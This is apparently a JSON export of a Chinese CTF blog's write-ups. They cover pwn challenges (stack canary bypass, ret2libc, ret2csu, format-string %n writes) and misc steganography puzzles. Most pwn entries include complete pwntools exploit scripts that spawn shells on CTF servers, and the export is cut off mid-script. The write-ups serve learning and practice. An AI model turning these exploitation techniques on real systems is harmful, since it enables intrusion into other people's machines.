[{"id":"d80adffe0e6ac7d06b461539fbc0ad33","title":"绕过canary的方法","content":"泄露地址绕过这种方法对应特定类型的题目，题目中会有两个输入，至少一个输出。通过第一次输入泄露出canary，第二次利用泄露的canary来绕过，从而实现栈溢出\nstackguard1一个简单的64位canary保护程序，gdb调试可以看到一开始程序会从fs寄存器对应的偏移处取值放入rax中，rax会放入rbp-8的位置，最后清零eax\n程序运行到快结束时，会检查canary，首先将canary取出到rcx，rcx会和fs寄存器对应的偏移处取出进行比较，不同就会跳转到__stack_chk_fail@plt位置\n__stack_chk_fail函数会强行结束进程并弹出警告\n分析栈结构：缓冲区过后就是canary，所以如果是简单的溢出覆盖返回地址就会覆盖到canary，从而导致程序崩溃。因此，如果要利用栈溢出就一定要绕过canary。所以思路就是先通过输出函数泄露canary的值，之后在覆盖时用泄露的canary值覆盖canary，其它的就覆盖成我们想要的，这样就绕过了canary。\n\n通过字符串列表找到bin/sh，找到调用的位置，发现函数canary_protect_me函数里面会调用这个字符串，仔细分析一下，可以断定圈里面的汇编代码组装成函数execve(“bin/sh”,0,0) 等价于system(“bin/sh”)，所以我们可以利用栈溢出跳转到这里就可以获得shell\n\n因为是gets函数最后会补上\\x00，会终止printf读取，所以无法通过覆盖泄露，但因为是printf输出，所以可以采取格式化字符串漏洞泄露canary\nEXP123456789101112131415from pwn import *context.log_level = &#x27;debug&#x27;context.arch = &#x27;amd64&#x27;back_door = (0x4011d6pop_rdi_ret = 0x0401343bin_sh = 0x402004#p = process(&#x27;./stackguard1&#x27;)p = remote(&#x27;123.57.230.48&#x27;,12344)payload1 = &#x27;%11$p&#x27;  # 泄露出第十一个参数的值p.sendline(payload1)canary=int(p.recv(),16)  # 将接收的转为十六进制数print canaryp.sendline(&#x27;a&#x27;*0x28+p64(canary)+&#x27;a&#x27;*8+p64(back_door))#gdb.attach(p,&#x27;b main&#x27;)p.interactive()\n\none by one爆破虽然每次重启程序的canary会不同，但是在同一个进程中不同的线程中的canary是相同的，也就是说fork()函数创建的子进程中的canary是相同的。利用这一点我们可以逐字节爆破出来。\nbin1程序中存在fork函数，而且还是无限输出，符合one by one爆破条件，因为是32位程序，canary第一个字符是\\x00，所以我们只需要爆破3个字节，这三个字节对应的十六进制码范围为00~FF\n\nEXP12345678910111213141516171819202122232425262728from pwn import *local = 1elf = ELF(&#x27;./bin1&#x27;)if local:    p = process(&#x27;./bin1&#x27;)    libc = elf.libcelse:    p = remote(&#x27;&#x27;,)    libc = ELF(&#x27;./&#x27;)p.recvuntil(&#x27;welcome\\n&#x27;)canary = &#x27;\\x00&#x27;for k in range(3):    for i in range(256):        print &quot;the &quot; + str(k) + &quot;: &quot; + chr(i)        p.send(&#x27;a&#x27;*100 + canary + chr(i))        a = p.recvuntil(&quot;welcome\\n&quot;)        print a        if &quot;sucess&quot; in a:                canary += chr(i)                print &quot;canary: &quot; + canary                breakaddr = 0x0804863Bpayload = &#x27;A&#x27; * 100 + canary + &#x27;A&#x27; * 12 + p32(addr)p.send(payload)p.interactive()\n\n\n\n","slug":"绕过canary的方法","date":"2021-10-25T12:49:23.000Z","categories_index":"pwn","tags_index":"笔记","author_index":"Krito"},{"id":"52662f34cef48ec0871eed4c3bef0137","title":"ctfshow-pwn","content":"pwn03将附件拖进IDA中很容易发现存在栈溢出，但是没有后门函数以及system函数，也不能利用系统调用\n所以函数地址泄露获得libc版本来获得system函数地址从而获得shell。具体步骤：\n\n泄露 puts地址\n获取 libc 版本\n获取 system 地址与 /bin/sh 的地址\n再次执行源程序\n触发栈溢出执行 system(‘/bin/sh’)\n\nexp12345678910111213141516171819from pwn import *from LibcSearcher import LibcSearcher#p = process(&#x27;./stack1&#x27;)p = remote(&#x27;pwn.challenge.ctf.show&#x27;,28015)elf = ELF(&#x27;./stack1&#x27;)puts_plt = elf.plt[&#x27;puts&#x27;]       # 获取puts的pltputs_got = elf.got[&#x27;puts&#x27;]           # 获取puts的gotstart_addr = elf.symbols[&#x27;_start&#x27;]          # 获取程序开始地址payload1 = flat([&#x27;a&#x27;*13,puts_plt,start_addr,puts_got])         # 泄露puts的got地址p.sendline(payload1)p.recvuntil(&#x27;\\n\\n&#x27;)         # 这里耽误了好久，因为要读取掉两个换行符，不然后面获取地址就会出错libc_puts_addr = u32(p.recv()[0:4])          # 接收泄露的地址libc = LibcSearcher(&#x27;puts&#x27;, libc_puts_addr)        # 找到对应的libclibcbase = libc_puts_addr - libc.dump(&#x27;puts&#x27;)         # 计算基地址sys_addr = libcbase+libc.dump(&#x27;system&#x27;)         # 算出system函数的地址bin_sh = libcbase+libc.dump(&#x27;str_bin_sh&#x27;)payload = flat([&#x27;a&#x27;*13,sys_addr,&#x27;a&#x27;*4,bin_sh])p.sendline(payload)p.interactive()\n\npwn04用ida打开发现存在明显的栈溢出并且还存在后门函数\n\nchecksec查看发现存在canary保护，所以思路就是绕过canary保护进入后门函数从而获取shell\n通过IDA查看可以发现canary在ebp-c的位置，所以我们可以利用第一轮输入来泄露canary\n1234payload1 = &#x27;a&#x27;*0x64p.sendlineafter(&#x27;Hello Hacker!\\n&#x27;,payload1)a = p.recvline()canary = p.recv(7).rjust(8,&#x27;\\x00&#x27;)\n\n因为存在回显所以要将回显接收不然canary就会出错，已经踩坑\n\n获取了canary接下来就是绕过canary进入后门函数\n12payload2 = flat([&#x27;a&#x27;*0x64,canary,&#x27;a&#x27;*8,get_shell])p.sendline(payload2)\n\n因为canary是四个字节，而到返回地址还需要0x70-0x64-4=8个字节，所以需要补充8个字节\nEXPexp1:\n123456789101112from pwn import *p = remote(&#x27;pwn.challenge.ctf.show&#x27;,28132)# p = process(&#x27;./ex2&#x27;)get_shell = 0x80485AFpayload1 = &#x27;a&#x27;*0x64p.sendlineafter(&#x27;Hello Hacker!\\n&#x27;,payload1)a = p.recvline()canary = p.recv(7).rjust(8,&#x27;\\x00&#x27;)print canarypayload2 = flat([&#x27;a&#x27;*0x64,canary,&#x27;a&#x27;*8,get_shell])p.sendline(payload2)p.interactive()\n\nexp2：\n也是通过printf泄露，不过是通过计算canary到printf的偏移来泄露\n1234567891011from pwn import *#p = process(&quot;./ex&quot;)p =remote(&quot;111.231.70.44&quot;,28097)p.recv()leak_canary = &quot;%31$x&quot;p.sendline(leak_canary)canary = int(p.recv(),16)print(hex(canary))getshell = b&quot;a&quot; * 100 + p32(canary) + b&quot;b&quot; * 12 + p32(0x0804859B)p.sendline(getshell)p.interactive()\n\npwn07打开发现是64位程序，分析一下发现pwn03做法相同，泄露函数地址从而获取libc版本找到system函数进而获取shell。在某些细节上还是有点不同，32位是通过栈传递参数，而64位是通过寄存器传递参数(当参数小于7个时，参数从左到右放入寄存器rdi,rsi,rdx,rcx,r8,r9)，所以执行system(“bin/sh”)时rdi寄存器要存储的是bin/sh字符串，例如：\n泄露puts函数需要先将puts的got表地址传递到rdi寄存器中在跳转到puts函数输出\n1payload1 = &#x27;a&#x27;*20 + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(start_addr)\n\n在执行system函数时不仅要记住通过rdi传参还要注意堆栈对齐：\n1payload = &#x27;a&#x27;*20+p64(ret_addr)+p64(pop_rdi_ret)+p64(bin_sh)+p64(sys_addr)\n\np64(ret_addr)目的用于堆栈对齐，不然后面会报错。\nEXP123456789101112131415161718192021from pwn import *from LibcSearcher import LibcSearcher#p = process(&#x27;./pwn1&#x27;)p = remote(&#x27;pwn.challenge.ctf.show&#x27;,28138)pop_rdi_ret = 0x04006e3ret_addr = 0x0004006E4elf = ELF(&#x27;./pwn1&#x27;)puts_plt = elf.plt[&#x27;puts&#x27;]puts_got = elf.got[&#x27;puts&#x27;]start_addr = elf.symbols[&#x27;_start&#x27;]payload1 = &#x27;a&#x27;*20 + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(start_addr)p.sendline(payload1)p.recvuntil(&#x27;\\x0a&#x27;)libc_puts_addr = u64(p.recv(6).ljust(8,b&#x27;\\x00&#x27;))libc = LibcSearcher(&#x27;puts&#x27;, libc_puts_addr)libcbase = libc_puts_addr - libc.dump(&#x27;puts&#x27;)sys_addr = libcbase+libc.dump(&#x27;system&#x27;)bin_sh = libcbase+libc.dump(&#x27;str_bin_sh&#x27;)payload = &#x27;a&#x27;*20+p64(ret_addr)+p64(pop_rdi_ret)+p64(bin_sh)+p64(sys_addr)p.sendline(payload)p.interactive()\n\npwn1012345678910111213141516171819202122232425%a  浮点数、十六进制数字和p-记数法（c99%A  浮点数、十六进制数字和p-记法（c99）%c  一个字符(char)%C  一个ISO宽字符%d  有符号十进制整数(int)（%ld、%Ld：长整型数据(long),%hd：输出短整形。）　%e  浮点数、e-记数法%E  浮点数、E-记数法%f  单精度浮点数(默认float)、十进制记数法（%.nf  这里n表示精确到小数位后n位.十进制计数）%g  根据数值不同自动选择%f或%e．%G  根据数值不同自动选择%f或%e.%i  有符号十进制数（与%d相同）%n：将%n之前printf已经打印的字符个数赋值给偏移处指针所指向的地址位置%o  无符号八进制整数%p  指针%s  对应字符串char*（%s &#x3D; %hs &#x3D; %hS 输出 窄字符）%S  对应宽字符串WCAHR*（%ws &#x3D; %S 输出宽字符串）%u  无符号十进制整数(unsigned int)%x  使用十六进制数字0xf的无符号十六进制整数　%X  使用十六进制数字0xf的无符号十六进制整数%%  打印一个百分号 %I64d 用于INT64 或者 long long%I64u 用于UINT64 或者 unsigned long long%I64x 用于64位16进制数据%m.n : m指域宽，即对应的输出项在输出设备上所占的字符数。n指精度。用于说明输出的实型数的小数位数。为指定n时，隐含的精度为n&#x3D;6位。l 对整型指long型，对实型指double型。h用于将整型的格式字符修正为short型。\n\n打开后发现当num==16时就可以得到flag，但是没有栈溢出可以覆盖num的值。仔细观察，这里输出用的是printf函数存在格式字符串漏洞，我们可以利用%n去修改num，首先需要num的地址，其次需要一个参数指向num。通过发现我们可以看到scanf对format赋值了两次，所以我们可以先将num的地址赋给format，接下来使用%n来修改format指向num的值\n\nEXP12345678from pwn import *p = remote(&#x27;pwn.challenge.ctf.show&#x27;,28101)#p = process(&quot;./pwn10&quot;)num_addr = 0x0804A030payload = p32(num_addr)+&quot;aaaaaaaaaaaa%7$n&quot;p.sendline(payload)p.interactive()\n\n萌新赛-签到题就是简单的libc泄露。计算一下src的偏移，找到相应gadget泄露函数地址在获得libc的版本获取system函数和字符串bin/sh地址，最后组装一下就行\n\n12345678910111213141516171819202122from pwn import *from LibcSearcher import LibcSearchercontext.log_level = &#x27;debug&#x27;context.arch = &#x27;amd64&#x27;p = process(&#x27;./pwn_check_in&#x27;)elf = ELF(&#x27;pwn_check_in&#x27;)puts_plt=elf.plt[&quot;puts&quot;]puts_got=elf.got[&quot;puts&quot;]start_addr=elf.symbols[&quot;_start&quot;]pop_rdi_ret = 0x400793ret_addr = 0x40053epayload1 = &#x27;a&#x27;*0x78+p64(pop_rdi_ret)+p64(puts_got)+p64(puts_plt)+p64(start_addr)p.sendlineafter(&#x27;[+] command successful!\\n&#x27;,payload1)p.recvuntil(&#x27;hhh,just a joke&#x27;)puts_addr = u64(p.recv(6).ljust(8,&#x27;\\x00&#x27;))libc=LibcSearcher(&quot;puts&quot;,puts_addr)libcbase=puts_addr-libc.dump(&quot;puts&quot;)system_addr=libcbase+libc.dump(&quot;system&quot;)binsh_addr=libcbase+libc.dump(&quot;str_bin_sh&quot;)payload2 = &#x27;a&#x27;*0x78+p64(ret_addr)+p64(pop_rdi_ret)+p64(binsh_addr)+p64(system_addr)p.sendlineafter(&#x27;[+] command successful!\\n&#x27;,payload2)p.interactive()\n\n内部赛-签到题此题与ret2csu做法相同，因为没有puts函数但是存在write函数，所以我们采取组装write函数来泄露地址，从而获取system函数以及bin/sh地址。\n\ngadgets和ret2csu里面的有点不一样但是大致是一样的。我们利用这两个gadgets来组装write函数，泄露我们想泄露函数的got表中地址\n1payload1 = &#x27;b&#x27;*0xa8+p64(gadget1)+p64(0)+p64(0)+p64(1)+p64(got_write)+p64(8)+p64(got_write)+p64(1)+p64(gadget2)+&#x27;a&#x27;*56+ p64(start)\n\n之后利用泄露的地址计算system函数以及bin/sh地址\n12345write_addr = u64(p.recv(6).ljust(8,b&#x27;\\x00&#x27;))libc = LibcSearcher(&#x27;write&#x27;, write_addr)libcbase = write_addr-libc.dump(&#x27;write&#x27;)system_addr = libcbase+libc.dump(&#x27;system&#x27;)binsh_addr=libcbase+libc.dump(&quot;str_bin_sh&quot;)\n\n最后组装payload2来控制程序执行system(“bin/sh”)\n1payload2 = &#x27;a&#x27;*0xa8+p64(ret_addr)+p64(pop_rdi_ret)+p64(binsh_addr)+p64(system_addr)\n\nEXP123456789101112131415161718192021222324from pwn import *from LibcSearcher import LibcSearchercontext.log_level = &#x27;debug&#x27;context.arch = &#x27;amd64&#x27;#p = process(&#x27;./ret2libc_64&#x27;)p = remote(&#x27;pwn.challenge.ctf.show&#x27;,28177)elf = ELF(&#x27;ret2libc_64&#x27;)got_write = elf.got[&#x27;write&#x27;]got_write = elf.got[&#x27;write&#x27;]start = elf.symbols[&#x27;_start&#x27;]  pop_rdi_ret = 0x04006c3ret_addr = 0x004004a9gadget1 = 0x4006b6gadget2 = 0x04006A0payload1 = &#x27;b&#x27;*0xa8+p64(gadget1)+p64(0)+p64(0)+p64(1)+p64(got_write)+p64(8)+p64(got_write)+p64(1)+p64(gadget2)+&#x27;a&#x27;*56+ p64(start)p.sendlineafter(&#x27;now,Try Pwn Me?\\n&#x27;,payload1)write_addr = u64(p.recv(6).ljust(8,b&#x27;\\x00&#x27;))libc = LibcSearcher(&#x27;write&#x27;, write_addr)libcbase = write_addr-libc.dump(&#x27;write&#x27;)system_addr = libcbase+libc.dump(&#x27;system&#x27;)binsh_addr=libcbase+libc.dump(&quot;str_bin_sh&quot;)payload2 = &#x27;a&#x27;*0xa8+p64(ret_addr)+p64(pop_rdi_ret)+p64(binsh_addr)+p64(system_addr)p.sendlineafter(&#x27;now,Try Pwn Me?\\n&#x27;,payload2)p.interactive()\n\n36D杯-签到签到题直接nc上去以后发现考察的是linux的基本操作，程序过滤掉了空格，cat，但是我们可以ls查看\n1more&lt;flag               这里&lt;可以绕过空格\n\nBJDCTF2020-babyrouter不知道是远端有问题还是libc库不全，本地打通了但是远端没有打通，反正思路在这里\n很明显的一道libc泄露题目，buf的偏移是0x20\n\n寻找gadgets\n\n\n构造payload1，payload2\n12payload1 = &#x27;a&#x27;*0x28+p64(pop_rdi_ret)+p64(puts_got)+p64(puts_plt)+p64(start_addr)payload2 = &#x27;a&#x27;*0x28+p64(ret)+p64(pop_rdi_ret)+p64(binsh_addr)+p64(system_addr)\n\nEXP123456789101112131415161718192021222324252627from pwn import *from LibcSearcher import *context.log_level = &#x27;debug&#x27;context.arch = &#x27;amd64&#x27;#p = process(&#x27;./babyrouter&#x27;)p = remote(&#x27;pwn.challenge.ctf.show&#x27;,28044)elf=ELF(&#x27;./babyrouter&#x27;)puts_plt=elf.plt[&quot;puts&quot;]puts_got=elf.got[&quot;puts&quot;]start_addr=elf.symbols[&quot;_start&quot;]pop_rdi_ret=0x000400733ret = 0x4004c9payload1 = &#x27;a&#x27;*0x28+p64(pop_rdi_ret)+p64(puts_got)+p64(puts_plt)+p64(start_addr)p.sendlineafter(&#x27;Pull up your sword and tell me u story!&#x27;,payload1)p.recvuntil(&#x27;\\n&#x27;)puts_addr=u64(p.recv(6).ljust(8,&#x27;\\x00&#x27;))libc=LibcSearcher(&quot;puts&quot;,puts_addr)#libc=ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)libcbase=puts_addr-libc.dump(&quot;puts&quot;)#system_addr = libcbase + libc.sym[&#x27;system&#x27;]system_addr=libcbase+libc.dump(&quot;system&quot;)#binsh_addr = libcbase + libc.search(&#x27;/bin/sh\\0&#x27;).next()binsh_addr=libcbase+libc.dump(&quot;str_bin_sh&quot;)payload2 = &#x27;a&#x27;*0x28+p64(ret)+p64(pop_rdi_ret)+p64(binsh_addr)+p64(system_addr)#gdb.attach(p)p.sendlineafter(&#x27;Pull up your sword and tell me u story!&#x27;,payload2)p.interactive()\n\n","slug":"ctfshow-pwn","date":"2021-10-17T09:55:50.000Z","categories_index":"刷题","tags_index":"pwn","author_index":"Krito"},{"id":"050531b15fb9d2cd0cab573b50dcfcd8","title":"ctfshow-misc","content":"misc1签到题，打开就有flag\nmisc2打开txt文件出现一堆乱码，丢进winhex发现是png，直接改后缀名即可\nmisc3bpg文件使用bpgview工具打开，打开后即可获得flag\n\n","slug":"ctfshow-misc","date":"2021-10-16T14:43:36.000Z","categories_index":"刷题","tags_index":"misc","author_index":"Krito"},{"id":"144f81ea5594fe5e9363a228d67919cf","title":"Bugku pwn","content":"overflowcheck一下可以看到是64位程序，什么保护也没开，IDA查看，可以看到存在明显的栈溢出\n再看函数窗口，可以看见存在一个可疑的函数，点进去可以发现是一个后门函数\n\n所以思路就是利用栈溢出跳转到后门函数，这样就可以得到flag\nEXP12345from pwn import *p = process(&quot;./pwn2&quot;)payload = &#x27;a&#x27;*0x30+&#x27;a&#x27;*8+p64(0x400769)p.sendline(payload)p.interactive()\n\noverflow2check一下，64位开了NX保护。IDA查看，存在溢出\n在函数窗口发现system函数，在字符串窗口发现bin/sh。可以利用ROP来获得shell\n找到gadget的地址\n构建payload就可以了\nEXP123456789from pwn import *#p = process(&quot;./pwn5&quot;)p = remote(&quot;114.67.246.176&quot;,15097)sys_addr = 0x401050bin_sh = 0x402004pop_rdi = 0x40126bpayload = &#x27;a&#x27;*0x20+&#x27;a&#x27;*8+p64(pop_rdi)+p64(bin_sh)+p64(sys_addr)p.sendline(payload)p.interactive()\n\n\n\nread_note签到题，直接可以获得flag\nCanary看题目就知道是考canary，check一下，发现是一个64位程序，开了canary和NX保护\n查看一下伪代码，很明显，存在栈溢出漏洞，read可以读取0x300字节，但缓冲区只有0x240字节空间\n查看字符串，发现存在bin/sh，在函数表里面也存在system函数\n所以思路大概出来了，利用gadgets来获取shell。接下来就是思考如何解决canary保护，观察伪代码，里面有printf函数，我们可以利用printf函数来泄露canary，printf函数输出时会以x00为输出结尾，只要我们将canary值的x00覆盖掉就可以泄露了。\n所以，第一步，获取gadgets。因为是64位程序，所以传参时前六个参数是利用rdi, rsi, rdx, rcx, r8, r9寄存器来传递，所以需要将bin/sh传递到rdi寄存器。\n接下来就是泄露canary，buf的偏移量是0x240-8(减8是因为canary的值在ebp减8的位置)，之后利用printf函数泄露即可。\n最后再组装一下就可以得出exp了。\nEXP12345678910111213from pwn import *p = process(&#x27;./pwn4_&#x27;)pop_rdi = 0x400963binsh = 0x601068sys = 0x40080Cpayload = &#x27;a&#x27; * (0x240 - 8)p.sendlineafter(&#x27;Please leave your name(Within 36 Length):&#x27;, payload)p.recvline()canary = p.recv(7).rjust(8, &#x27;\\x00&#x27;)print canarypayload1 = &#x27;a&#x27; * (0x210 - 8) + canary + &#x27;a&#x27;*8 + p64(pop_rdi) + p64(binsh) + p64(sys)p.sendafter(&#x27;Please leave a message(Within 0x200 Length):&#x27; , payload1)p.interactive()\n\n","slug":"Bugku-PWN","date":"2021-10-16T14:10:52.000Z","categories_index":"刷题","tags_index":"pwn","author_index":"Krito"},{"id":"baaff0bca7d1361050d55356188b2514","title":"Bugku misc","content":"BUGKU misc部分1 这是一张单纯的图片先看了一下属性，发现并没有什么有用的信息，打开就是上面那张图，没有上面异样，\n\n\n直接丢winhex，拖至最底，发现是unicode加密\n\n\n发现是unicode加密，直接解码成ASCII，得到flag\n\n\n\n2 隐写看到题目就知道是图片隐写，对图片进行校验和，发现结果有问题，说明照片高度被修改了\n\n\n修改高度得到flag\n\n\n\n3 telnet下载附件后打开，直接追踪TCP流就得到了flag\n\n\n\n4 眼见非实打开后发现文件是损坏的而且出现了PK字符，猜测里面藏有压缩包，于是改成压缩包形式打开\n\n\n在word里面的document.xml里面发现了flag\n\n\n\n5 啊哒老规矩，打开照片看属性，发现照相机型号有东西，之后应该用得上\n\n\n用binwalk查看，发现里面藏有一个压缩包，用foremost进行分离得到压缩包，打开发现是加密的，尝试了照相机型号，发现密码错误，分析了一下那串照相机型号，发现是十六进制，之后解码得到密码\n\n\n打开得到flag\n\n\n\n6 ping用wireshark打开后发现十六进制旁边一个f，打开其它的发现组合起来是flag\n\n\n\n7 赛博朋克打开后发现就一个光秃秃的加密文件，不用猜都知道是伪加密，丢进winhex修改一下就可以打开了\n\n\n打开文件后发现是一堆乱码，丢进winhex发现是png格式照片\n\n\n修改一下后缀名图片就出来了，不过好像flag还没出来，属性里面也没什么东西，校验和也正确，binwalk也没查出问题\n\n\n\n\n最后推测一个是lsb隐写，果不其然，得到flag\n\n\n\n8 贝斯手打开介绍发现是对图片上人物介绍，刚想关闭发现最下面还有东西，发现密码是四位数和这个贝斯手有关\n\n\n懒得搜直接暴力破解\n\n\n打开后发现是一串加密字符，5+58应该加密方式MD5和base58\n\n\n解码得到flag\n\n\n\n\n\n9 又一张图片，还单纯吗打开属性发现没有有用的信息，丢进winhex里面也没发现什么，用binwalk查看发现照片里面有其它jpg照片，用forem分离\n\n\n发现图片里面有flag（不过这个flag有点长，有点离谱）\n\n\n\n10 猜签到题，百度识图，发现是刘亦菲，得到flag（注意flag格式）\n\n11 宽带信息泄露下载RouterPassView，用这个搜索username（用户名）\n\n\n\n12 隐写2直接丢进winhex，发现jpg图片结尾后面有压缩包的字符\n\n\n用foremost分离得到一个加密的文件和密码提示，解密（直接爆破，反正是三位数）得到一张图片\n\n\n老规矩丢winhex，发现最后有flag\n\n\n\n13 多种方法解决这道题提示说有二维码，打开附件发现是一个exe可执行文件（尝试打开发现无法运行），直接丢winhex\n\n\n发现是旁边是加密的图片编码，直接在线解码得到flag\n\n\n\n14 闪的好快emmmm，这道题挺简单的就是好烦，用Stegsolve.jar一帧一帧看，扫码，flag就出来了\n\n15 come_game打开后是个游戏，每次死亡都会多个文件，找到save1将它丢尽winhex里面，将2AC改成5AC在进游戏就可以得到flag，当然如果觉得能闯过去也应该能得到flag。（我没试过，不确定能不能行，提醒一下这个游戏打开了好像不能关闭）\n\n\n\n16 白哥的鸽子直接丢进winhex里面，发现照片结尾后面多出一些字符，分析一下就知道是栅栏加密\n\n\n解密（密匙我是一个一个试的，不过还好就是3，后面才知道那个提示“咕咕咕”好像就代表key=3）\n\n","slug":"bugku misc","date":"2021-10-16T13:24:11.000Z","categories_index":"刷题","tags_index":"misc","author_index":"Krito"},{"id":"9c4b020a9215e27197217b9ca10cd6d8","title":"BUU pwn","content":"原理栈溢出指的是程序向栈中某个变量中写入的字节数超过了这个变量本身所申请的字节数，因而导致与其相邻的栈中的变量的值被改变。这种问题是一种特定的缓冲区溢出漏洞，类似的还有堆溢出，bss 段溢出等溢出方式。栈溢出漏洞轻则可以使程序崩溃，重则可以使攻击者控制程序执行流程。此外，我们也不难发现，发生栈溢出的基本前提是\n\n程序必须向栈上写入数据。\n写入的数据大小没有被良好地控制。\n\nrip思路首先查看附件，发现没开什么保护，丢进IDA里面看一下\n\n发现可疑函数（fun），点进去可以发现函数调用了/bin/sh，接下来我们可以利用这个函数得到flag\n开始调试。首先创造一个长度为150的字符串，运行该附件，将那个字符串输入进去\n之后程序直接报错，因为return地址处不是一个正确的地址值，无法跳转。通过return的那个地址值，我们可以计算return距离输入点的长度。使用cyclic计算偏移量\n得到偏移量就可以写exp了\n编写EXP123456from pwn import *p = remote(&#x27;node3.buuoj.cn&#x27;,28652)fun = 0x401186payload = &#x27;a&#x27;*23+p64(fun+1)  //平衡堆栈p.sendline(payload)p.interactive()\n\nwarmup_csaw_2016思路也是一个简单的栈溢出，思路还是一样的，先查看保护，还是什么保护都没有开\n丢进IDA查看，就是输出两个语句和一个函数地址，查看函数，发现是打开flag文件。思路立刻就有了，因为是gets函数没有限制输入，所以可以通过栈溢出来获得flag。所以，接下来要计算偏移量\n还是和上面一题一样的方法计算偏移量\n\nEXP12345from pwn import *p=remote(&#x27;node3.buuoj.cn&#x27;,26972)payload=&#x27;a&#x27;*0x40+&#x27;a&#x27;*8+p64(0x40060D)p.sendline(payload)p.interactive()\n\nciscn_2019_n_1思路检查开了什么保护，发现只开了NX，其它没有开，也就是数据段不可执行\n扔进IDA查看，也就是调用了func函数，点进func函数，函数先是将用户输入的值赋予给v1，之后判断v2是否等于11.28125，如果等于就可以得到flag，所以思路就是计算v1和v2相差多少，再利用gets函数将v2覆盖为11.28125\n\n因为11.28125在内存中是以十六进制存储，所以要将11.28125转成十六进制\nEXP12345from pwn import *p = remote(&#x27;node3.buuoj.cn&#x27;,25675)payload = ‘a&#x27; *(0x30-0x4) + p64(0x41348000)p.sendline(payload)p.interactive()\n\npwn1_sctf_2016进入IDA发现存在后门函数和fgets函数，不过fgets函数限制了长度，这个长度无法造成溢出。但是在后面发现std::string::string函数，虽然不知道是干什么的但是根据名称猜测可能是由某字符串转变成另一字符串\n\n进入gdb调试，发现输入的I经过std::string::string函数会转变成you，换句话说也就是1和字符转成3个字符，而要造成栈溢出需要0x3c如果通过转化可以达到要求，也就是需要20个’I’\n\n之后就很简单了，通过转换造成栈溢出，跳转到后门函数获取shell\nEXP1234567from pwn import *#p = process(&#x27;./pwn1_sctf_2016&#x27;)p = remote(&#x27;node4.buuoj.cn&#x27;,26513)get_shell = 0x8048F13payload1 = &#x27;I&#x27;*20+&#x27;a&#x27;*4+p32(get_shell)p.sendline(payload1)p.interactive()\n\n\njarvisoj_level0简单的栈溢出，直接上exp\nEXP123456from pwn import *p = process(&#x27;./level0&#x27;)get_shell = 0x40059Apayload1 = &#x27;a&#x27;*0x88+p64(get_shell)p.sendline(payload1)p.interactive()\n\n\n\nciscn_2019_c_1使用IDA打开，在加密函数中存在危险函数gets，可以造成栈溢出。因为没有system以及bin/sh字符串，所以采取libc泄露来做此题\n\n所以基本思路就是运行两次，先泄露函数地址获得libc，计算得到system函数和bin/sh字符串地址，第二次运行执行system函数获得shell\npayload1:\n1payload1=&quot;A&quot;*88+p64(pop_rdi_addr)+p64(puts_got)+p64(puts_plt)+p64(start_addr)\n\npayload2:\n1payload2=&quot;A&quot;*88+p64(ret_addr)+p64(pop_rdi_addr)+p64(binsh_addr)+p64(system_addr)\n\np64(ret_addr)：目的是让堆栈对齐\nEXP12345678910111213141516171819202122232425262728293031323334from pwn import *from LibcSearcher import *context.log_level = &#x27;debug&#x27;context.arch = &#x27;amd64&#x27;p=process(&#x27;./ciscn_2019_c_1&#x27;)#p=remote(&#x27;node4.buuoj.cn&#x27;,25488)elf=ELF(&#x27;./ciscn_2019_c_1&#x27;)puts_plt=elf.plt[&quot;puts&quot;]puts_got=elf.got[&quot;puts&quot;]start_addr=elf.symbols[&quot;_start&quot;]pop_rdi_addr=0x400c83p.recvuntil(&quot;Input your choice!\\n&quot;)p.sendline(&quot;1&quot;)p.recvuntil(&quot;Input your Plaintext to be encrypted\\n&quot;)payload1=&quot;A&quot;*88+p64(pop_rdi_addr)+p64(puts_got)+p64(puts_plt)+p64(start_addr)p.sendline(payload1)#gdb.attach(p,&#x27;b  main&#x27;)p.recvuntil(&quot;Ciphertext\\n&quot;)p.recvuntil(&quot;\\n&quot;)puts_addr=u64(p.recv(6).ljust(8,&#x27;\\x00&#x27;))p.info(&#x27;puts_addr==&gt;%#x&#x27;,puts_addr)libc=LibcSearcher(&quot;puts&quot;,puts_addr)libcbase=puts_addr-libc.dump(&quot;puts&quot;)print libcbase#gdb.attach(p,&#x27;b  main&#x27;)system_addr=libcbase+libc.dump(&quot;system&quot;)binsh_addr=libcbase+libc.dump(&quot;str_bin_sh&quot;)p.recvuntil(&quot;Input your choice!\\n&quot;)p.sendline(&quot;1&quot;)p.recvuntil(&quot;Input your Plaintext to be encrypted\\n&quot;)ret_addr=0x4006b9payload2=&quot;A&quot;*88+p64(ret_addr)+p64(pop_rdi_addr)+p64(binsh_addr)+p64(system_addr)p.sendline(payload2)p.interactive()\n\nciscn_2019_n_832位程序，有一个输入，之后判断var[13]是否等于17，如果等于17就执行system函数，而我们的输入会存储到var中，所以只要我们输入到var[13]时的值为17就可以\n\nEXP123456from pwn import *#p = process(&#x27;./ciscn_2019_n_8&#x27;)p = remote(&#x27;node4.buuoj.cn&#x27;,27044)payload = p32(0)*13+p32(17)p.sendlineafter(&quot;What&#x27;s your name?&quot;,payload)p.interactive()\n\nnot_the_same_3dsctf_2016查看反汇编代码，很明显存在栈溢出，同时还存在后门函数，这个函数会读取flag.txt文件到fl4g地址。\n不仅如此，程序还存在write函数\n所以思路就是通过栈溢出跳转到后门函数之后执行write函数泄露对应地址的flag\nEXP12345678910from pwn import *#p = process(&#x27;./not_the_same_3dsctf_2016&#x27;)p = remote(&#x27;node4.buuoj.cn&#x27;,26667)elf = ELF(&#x27;not_the_same_3dsctf_2016&#x27;)flag = 0x80ECA2Dget_flag = 0x80489A0write_addr = 0x806E270payload = &#x27;a&#x27;*45+p32(get_flag)+p32(write_addr)+&#x27;a&#x27;*4+p32(1)+p32(flag)+p32(45)p.sendline(payload)p.interactive()\n\nbabyrop拿到题目分析程序，首先程序会从/dev/urandom读取随机数，写入到buf中\n\n接下来会将随机数写入s中，再将我们输入的数写到buf中，比较buf和s，如果不同就退出，相同就返回v5\n\n接下来判断v5是否等于127等于就允许输入0xc8个字节，不同就输入v5个字节\n\n很明显，在判断v5时存在栈溢出，只要v5够大就可以覆盖返回地址。所以接下来就是如何通过strncmp函数以及修改v5的值。strncmp匹配两个字符串时，如果一样就返回0，但是遇到\\x00就会停止读取，所以我们可以输入\\x00从而绕过strncmp函数。\n\n很明显，输入buf时可以覆盖v5，所以可以利用溢出来修改v5为我们想要的值。最后就是简单的libc泄露了。\nEXP1234567891011121314151617181920212223242526from pwn import 